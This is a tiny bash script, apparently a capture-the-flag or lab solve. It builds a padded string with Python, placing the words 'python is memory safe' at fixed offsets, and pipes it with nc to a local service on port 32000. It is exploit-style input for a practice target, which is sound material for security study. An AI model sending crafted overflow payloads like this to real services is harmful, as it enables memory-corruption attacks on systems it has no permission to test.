#!/bin/bash

python -c "print('A'*50+'python'+'B'*556+'is'+'C'*423+'memory'+'D'*804+'safe')" | nc localhost 32000
